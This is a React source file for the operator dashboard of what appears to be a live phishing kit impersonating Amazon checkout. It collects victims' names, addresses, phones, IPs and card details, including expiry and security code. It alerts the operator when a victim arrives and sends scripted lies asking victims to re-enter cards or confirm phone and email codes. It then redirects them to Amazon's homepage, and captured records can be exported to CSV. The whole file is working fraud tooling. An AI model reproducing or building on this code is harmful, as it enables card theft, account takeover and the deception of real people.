import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { socket } from './socket';
import { useAdminRows } from './hooks/useAdminRows';
import { useAdminConnection, readAdminPasswordFromSession } from './hooks/useAdminConnection';
import { AdminLogin } from './ui/AdminLogin';
import { AdminHeaderBar } from './ui/AdminHeaderBar';
import { AdminToolbarPanel } from './ui/AdminToolbarPanel';
import { AdminRecordsTable } from './ui/AdminRecordsTable';
import { CardPreviewModal } from './ui/CardPreviewModal';
import type { AdminUpdatePayload, FilterKey, OnlineUser, RecordRow, RouteTarget, SortKey } from './types';
import { fmtAgo, safeText, statusCategory, toCsv, toZhStatus } from './utils/adminFormatters';

type CardPreviewData = {
  id: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutExpiryDate?: string;
  checkoutCode?: string;
};

export default function AdminDashboard() {
  const [records, setRecords] = useState<RecordRow[]>([]);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [adminPassword, setAdminPassword] = useState(() => readAdminPasswordFromSession());
  const [q] = useState('');
  const [filter, setFilter] = useState<FilterKey>('all');
  const [onlyMain, setOnlyMain] = useState(false);
  const [onlyOnline, setOnlyOnline] = useState(false);
  const [onlyCurrent, setOnlyCurrent] = useState(false);
  const [sortBy, setSortBy] = useState<SortKey>('id_desc');
  const [pageSize, setPageSize] = useState(50);
  const [page, setPage] = useState(1);
  const [expandAll, setExpandAll] = useState(true);
  const [collapsedMain, setCollapsedMain] = useState<Record<string, boolean>>({});
  const [showHistory, setShowHistory] = useState<Record<string, boolean>>({});
  const [pendingRecords, setPendingRecords] = useState<RecordRow[] | null>(null);
  const [pendingOnlineUsers, setPendingOnlineUsers] = useState<OnlineUser[] | null>(null);
  const [pendingCount, setPendingCount] = useState(0);
  const [clickRateLabel, setClickRateLabel] = useState('0/0 (0.0%)');
  const [viewLocked, setViewLocked] = useState(false);
  const [cardPreview, setCardPreview] = useState<CardPreviewData | null>(null);
  const recordsLenRef = useRef(0);
  const viewLockedRef = useRef(false);
  const enterNoticeBootstrappedRef = useRef(false);
  const enterNotifiedIdsRef = useRef<Set<string>>(new Set());

  useEffect(() => {
    recordsLenRef.current = records.length;
  }, [records.length]);

  useEffect(() => {
    viewLockedRef.current = viewLocked;
  }, [viewLocked]);

  useEffect(() => {
    const onScroll = () => {
      const locked = window.scrollY > 8;
      setViewLocked((prev) => (prev === locked ? prev : locked));
    };
    onScroll();
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  const applyWithScrollLock = useCallback((nextRecords: RecordRow[] | null, nextOnline: OnlineUser[] | null) => {
    const y = window.scrollY;
    if (nextRecords) setRecords(nextRecords);
    if (nextOnline) setOnlineUsers(nextOnline);
    setPendingRecords(null);
    setPendingOnlineUsers(null);
    setPendingCount(0);
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        window.scrollTo({ top: y });
      });
    });
  }, []);

  const handleAdminUpdate = useCallback(
    (data: AdminUpdatePayload) => {
      const nextRecords = Array.isArray(data.records) ? (data.records as RecordRow[]) : null;
      const nextOnline = Array.isArray(data.onlineUsers) ? (data.onlineUsers as OnlineUser[]) : null;
      const visits = Number(data.stats?.visits || 0);
      const clicks = Number(data.stats?.clicks || 0);
      const clickRate = Number(data.stats?.clickRate || 0);
      setClickRateLabel(`${clicks}/${visits} (${clickRate.toFixed(1)}%)`);

      if (viewLockedRef.current) {
        if (nextRecords) {
          setPendingRecords(nextRecords);
          setPendingCount((prev) => {
            const add = Math.max(0, nextRecords.length - recordsLenRef.current);
            return Math.max(prev, add);
          });
        }
        if (nextOnline) setPendingOnlineUsers(nextOnline);
        return;
      }

      applyWithScrollLock(nextRecords, nextOnline);
    },
    [applyWithScrollLock]
  );

  const {
    adminAuthed,
    authLoading,
    authError,
    connectionState,
    lastDisconnectReason,
    lastDisconnectAt,
    lastConnectError,
    reconnectCount,
    requestAdminAuth,
  } = useAdminConnection({
    adminPassword,
    onAdminUpdate: handleAdminUpdate,
    onAuthFailed: () => {
      setRecords([]);
      setOnlineUsers([]);
      setPendingRecords(null);
      setPendingOnlineUsers(null);
      setPendingCount(0);
      setClickRateLabel('0/0 (0.0%)');
    },
  });

  useEffect(() => {
    if (!viewLocked && (pendingRecords || pendingOnlineUsers)) {
      applyWithScrollLock(pendingRecords, pendingOnlineUsers);
    }
  }, [viewLocked, pendingRecords, pendingOnlineUsers, applyWithScrollLock]);

  const copyText = useCallback(async (text: string) => {
    try {
      await navigator.clipboard?.writeText(text);
    } catch {
      // ignore
    }
  }, []);

  const pushBrowserNotice = useCallback((title: string, body: string) => {
    if (typeof window === 'undefined' || !('Notification' in window)) return;

    const show = () => {
      try {
        new Notification(title, { body, tag: `admin-enter-${Date.now()}` });
      } catch {
        // ignore notification failures
      }
    };

    if (Notification.permission === 'granted') {
      show();
      return;
    }

    if (Notification.permission === 'default') {
      Notification.requestPermission()
        .then((permission) => {
          if (permission === 'granted') show();
        })
        .catch(() => {
          // ignore
        });
    }
  }, []);

  const playEnterSound = useCallback(() => {
    if (typeof window === 'undefined') return;

    try {
      const AudioCtx = window.AudioContext || (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
      if (!AudioCtx) return;

      const ctx = new AudioCtx();
      if (ctx.state === 'suspended') {
        void ctx.resume().catch(() => {
          // ignore
        });
      }

      const playTone = (startAt: number, freq: number, duration: number, gainValue: number) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, ctx.currentTime + startAt);
        gain.gain.setValueAtTime(0.0001, ctx.currentTime + startAt);
        gain.gain.exponentialRampToValueAtTime(gainValue, ctx.currentTime + startAt + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + startAt + duration);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(ctx.currentTime + startAt);
        osc.stop(ctx.currentTime + startAt + duration + 0.02);
      };

      playTone(0, 880, 0.1, 0.045);
      playTone(0.16, 1175, 0.12, 0.04);

      window.setTimeout(() => {
        void ctx.close().catch(() => {
          // ignore
        });
      }, 500);
    } catch {
      // ignore audio failures
    }
  }, []);

  const openCardPreview = useCallback((r: RecordRow) => {
    setCardPreview({
      id: r.id.toString(),
      checkoutName: r.checkoutName,
      checkoutPhone: r.checkoutPhone,
      checkoutExpiryDate: r.checkoutExpiryDate,
      checkoutCode: r.checkoutCode,
    });
  }, []);

  const { grouped, filterCounts, totalRows, totalPages, safePage, pageStart, pagedRows } = useAdminRows({
    records,
    sortBy,
    q,
    filter,
    onlyMain,
    onlyOnline,
    onlyCurrent,
    collapsedMain,
    expandAll,
    page,
    pageSize,
  });

  const groupRecordMap = useMemo(() => {
    const map = new Map<number, RecordRow[]>();
    for (const group of grouped) {
      const list = [group.main, ...group.subs].filter(Boolean) as RecordRow[];
      map.set(group.mainId, list);
    }
    return map;
  }, [grouped]);

  const freshEnteredRecords = useMemo(() => {
    const now = Date.now();
    return records
      .filter((item) => safeText(item.status).toLowerCase().includes('entered home') && now - (item.updatedAt || 0) < 10 * 60_000)
      .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))
      .slice(0, 6);
  }, [records]);

  const highlightedRowIds = useMemo(() => new Set(freshEnteredRecords.map((item) => item.id.toString())), [freshEnteredRecords]);

  const getHistoryRows = useCallback(
    (mainId: number, excludeId: RecordRow['id']) => {
      const rows = groupRecordMap.get(mainId) || [];
      return rows.filter((item) => item.id.toString() !== excludeId.toString()).slice(0, 3);
    },
    [groupRecordMap]
  );

  useEffect(() => {
    setPage(1);
  }, [filter, onlyMain, onlyOnline, onlyCurrent, sortBy, pageSize]);

  useEffect(() => {
    if (page !== safePage) setPage(safePage);
  }, [page, safePage]);

  const toggleCollapse = useCallback(
    (mainId: number) => {
      setCollapsedMain((prev) => ({ ...prev, [mainId.toString()]: !(prev[mainId.toString()] ?? !expandAll) }));
    },
    [expandAll]
  );

  const toggleHistory = useCallback((id: RecordRow['id']) => {
    const key = id.toString();
    setShowHistory((prev) => ({ ...prev, [key]: !prev[key] }));
  }, []);

  const onlineCount = onlineUsers.filter((u) => u.online).length;

  const applyPreset = useCallback((preset: 'new_entered' | 'needs_action' | 'online' | 'refills') => {
    setPage(1);
    setExpandAll(true);
    setCollapsedMain({});

    if (preset === 'new_entered') {
      setOnlyMain(true);
      setOnlyOnline(false);
      setOnlyCurrent(false);
      setSortBy('recent_activity');
      setFilter('in_progress');
      return;
    }

    if (preset === 'needs_action') {
      setOnlyMain(true);
      setOnlyOnline(false);
      setOnlyCurrent(false);
      setSortBy('recent_activity');
      setFilter('needs_action');
      return;
    }

    if (preset === 'online') {
      setOnlyMain(true);
      setOnlyOnline(true);
      setOnlyCurrent(false);
      setSortBy('recent_activity');
      setFilter('all');
      return;
    }

    setOnlyMain(false);
    setOnlyOnline(false);
    setOnlyCurrent(false);
    setSortBy('recent_activity');
    setFilter('refills');
  }, [records]);

  const handleClear = useCallback(() => {
    if (window.confirm('确定清空所有记录？此操作不可恢复。')) {
      socket.emit('admin-clear-all', {}, (resp) => {
        if (!resp?.ok) alert(`清空失败：${resp?.error || 'unknown error'}`);
      });
    }
  }, []);

  const handleDownloadCsv = useCallback(() => {
    const ts = new Date().toISOString().replace(/[:.]/g, '-');
    const blob = new Blob(['\uFEFF', toCsv(records)], { type: 'text/csv;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `records-${ts}.csv`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }, [records]);

  const handleRefill = useCallback((socketId: string) => {
    if (!socketId) return;
    if (window.confirm('确定重填资料？会创建子序号。')) {
      socket.emit('request-refill', {
        socketId,
        reason: 'We found an issue with your shipping details. Please review and re-enter the address information for this order.',
      });
    }
  }, []);

  const handleCheckoutRefill = useCallback((socketId: string, recordId: RecordRow['id']) => {
    if (!socketId) return;
    if (window.confirm('确定重填结账？会在当前序号下重填，不会新增序号。')) {
      socket.emit('request-checkout-refill', {
        socketId,
        recordId,
        reason: 'We could not verify the payment method on file. Please review and re-enter your card details.',
      });
    }
  }, []);

  const routeUserTo = useCallback((socketId: string, target: RouteTarget) => {
    if (!socketId) {
      alert('缺少 socketId，无法跳转。');
      return;
    }
    const reason =
      target === 'verifyphone'
        ? 'Your previous verification code expired. Please confirm your phone number to receive a new code.'
        : target === 'emailverify'
          ? 'Your previous verification code expired. Please confirm your email address to receive a new code.'
          : undefined;
    socket.emit('admin-route-user', { socketId, target, reason }, (resp: any) => {
      if (!resp?.ok) alert(`跳转失败：${resp?.error || 'unknown error'}`);
    });
  }, []);

  const routeByFrontendJs = useCallback((socketId: string) => {
    if (!socketId) {
      alert('缺少 socketId，无法跳转。');
      return;
    }
    socket.emit('admin-route-url', { socketId, reason: 'Verification completed. Redirecting you to the Amazon homepage.' }, (resp: any) => {
      if (!resp?.ok) alert(`跳转失败：${resp?.error || 'unknown error'}`);
    });
  }, []);

  const badgeForActivity = useCallback((r: RecordRow) => {
    if (r.online === false) return { label: '离线', cls: 'bg-red-500/10 text-red-300 border-red-500/20' };
    const ms = Date.now() - (r.updatedAt || Date.now());
    if (ms < 20_000) return { label: `活跃 · ${fmtAgo(ms)}`, cls: 'bg-green-500/10 text-green-300 border-green-500/20' };
    if (ms < 120_000) return { label: `空闲 · ${fmtAgo(ms)}`, cls: 'bg-yellow-500/10 text-yellow-200 border-yellow-500/20' };
    return { label: `卡住 · ${fmtAgo(ms)}`, cls: 'bg-orange-500/10 text-orange-200 border-orange-500/20' };
  }, []);

  const clickRateDisplay = useMemo(() => {
    if (clickRateLabel.includes('(')) return clickRateLabel;
    return `${clickRateLabel}`;
  }, [clickRateLabel]);

  const filterLabelMap: Record<FilterKey, string> = {
    needs_action: '需处理',
    in_progress: '填写中',
    submitted: '已提交',
    offline: '离线',
    refills: '有重填',
    all: '全部',
  };

  useEffect(() => {
    const isEnterStatus = (status?: string) => safeText(status).toLowerCase().includes('entered home');

    if (!enterNoticeBootstrappedRef.current) {
      for (const record of records) {
        if (isEnterStatus(record.status)) enterNotifiedIdsRef.current.add(record.id.toString());
      }
      enterNoticeBootstrappedRef.current = true;
      return;
    }

    for (const record of records) {
      if (!isEnterStatus(record.status)) continue;
      const key = record.id.toString();
      if (enterNotifiedIdsRef.current.has(key)) continue;
      enterNotifiedIdsRef.current.add(key);
      playEnterSound();
      pushBrowserNotice('用户点击进入', `序号 ${key} · IP ${safeText(record.ip) || '-'}`);
    }

    if (enterNotifiedIdsRef.current.size > 5000) {
      const latest = new Set<string>(records.slice(0, 2000).map((item) => item.id.toString()));
      enterNotifiedIdsRef.current = latest;
    }
  }, [records, playEnterSound, pushBrowserNotice]);

  if (!adminAuthed) {
    return (
      <AdminLogin
        brandName="scherzeri"
        adminPassword={adminPassword}
        authLoading={authLoading}
        authError={authError}
        connectionState={connectionState}
        lastDisconnectAt={lastDisconnectAt}
        lastDisconnectReason={lastDisconnectReason}
        lastConnectError={lastConnectError}
        reconnectCount={reconnectCount}
        onPasswordChange={setAdminPassword}
        onSubmit={() => requestAdminAuth(adminPassword)}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[radial-gradient(circle_at_top,#1a2332_0%,#0d1117_45%,#0d1117_100%)] text-[#c9d1d9] p-3 sm:p-4 md:p-6 font-sans">
      <AdminHeaderBar
        title="scherzeri"
        onlineCount={onlineCount}
        clickRateLabel={clickRateDisplay}
        onClear={handleClear}
        onDownloadCsv={handleDownloadCsv}
      />

      <AdminToolbarPanel
        onlyMain={onlyMain}
        onOnlyMainChange={setOnlyMain}
        onlyOnline={onlyOnline}
        onOnlyOnlineChange={setOnlyOnline}
        onlyCurrent={onlyCurrent}
        onOnlyCurrentChange={setOnlyCurrent}
        sortBy={sortBy}
        onSortByChange={setSortBy}
        pageSize={pageSize}
        onPageSizeChange={setPageSize}
        onExpandAll={() => {
          setExpandAll(true);
          setCollapsedMain({});
        }}
        onCollapseAll={() => {
          setExpandAll(false);
          setCollapsedMain({});
        }}
        filter={filter}
        onFilterChange={setFilter}
        filterCounts={filterCounts}
        hasPending={!!(pendingRecords || pendingOnlineUsers)}
        pendingCount={pendingCount}
        applyPending={() => applyWithScrollLock(pendingRecords, pendingOnlineUsers)}
        onApplyPreset={applyPreset}
      />

      {freshEnteredRecords.length > 0 && (
        <div className="mb-3 rounded-2xl border border-emerald-500/20 bg-emerald-500/8 p-2.5">
          <div className="mb-2 flex items-center justify-between">
            <div>
              <div className="text-sm font-semibold text-emerald-200">刚进入队列</div>
              <div className="text-[11px] text-emerald-100/70">压缩成更扁的处理条目。</div>
            </div>
            <button
              onClick={() => applyPreset('new_entered')}
              className="rounded-lg border border-emerald-400/25 bg-emerald-400/10 px-2.5 py-1 text-[11px] text-emerald-100 hover:bg-emerald-400/15"
            >
              切到刚进入视图
            </button>
          </div>
          <div className="grid gap-1.5">
            {freshEnteredRecords.map((item) => (
              <button
                key={`fresh-${item.id}`}
                onClick={() => applyPreset('new_entered')}
                className="rounded-xl border border-emerald-400/20 bg-[#0f1720] px-2.5 py-1.5 text-left hover:border-emerald-300/35 hover:bg-[#14202c]"
              >
                <div className="flex items-center gap-2 text-[12px]">
                  <span className="min-w-[54px] font-mono font-semibold text-emerald-200">{item.id}</span>
                  <span className="max-w-[160px] truncate font-medium text-[#dce4ee]">{safeText(item.fullname) || '未填写姓名'}</span>
                  <span className="truncate text-[#9fb0c5]">{safeText(item.ip) || '-'}</span>
                  <span className="truncate text-[#6f8197]">{safeText(item.deviceType) || '-'}</span>
                  <span className="ml-auto shrink-0 rounded-md bg-emerald-400/10 px-1.5 py-0.5 text-[10px] text-emerald-100/80">
                    {item.updatedAt ? fmtAgo(Date.now() - item.updatedAt) : '-'}
                  </span>
                </div>
                <div className="mt-0.5 truncate text-[11px] text-[#8b949e]">{safeText(item.address) || safeText(item.fulladdress) || '暂无地址'}</div>
              </button>
            ))}
          </div>
        </div>
      )}

      <AdminRecordsTable
        rows={pagedRows}
        totalRows={totalRows}
        pageStart={pageStart}
        expandAll={expandAll}
        collapsedMain={collapsedMain}
        showHistory={showHistory}
        onToggleCollapse={toggleCollapse}
        onToggleHistory={toggleHistory}
        onCopyText={(text) => {
          void copyText(text);
        }}
        onOpenCardPreview={openCardPreview}
        onRefill={handleRefill}
        onCheckoutRefill={handleCheckoutRefill}
        onRouteUser={routeUserTo}
        onRouteByFrontendJs={routeByFrontendJs}
        badgeForActivity={badgeForActivity}
        getHistoryRows={getHistoryRows}
        formatStatus={toZhStatus}
        highlightedRowIds={highlightedRowIds}
      />

      {cardPreview && <CardPreviewModal data={cardPreview} onClose={() => setCardPreview(null)} />}
    </div>
  );
}
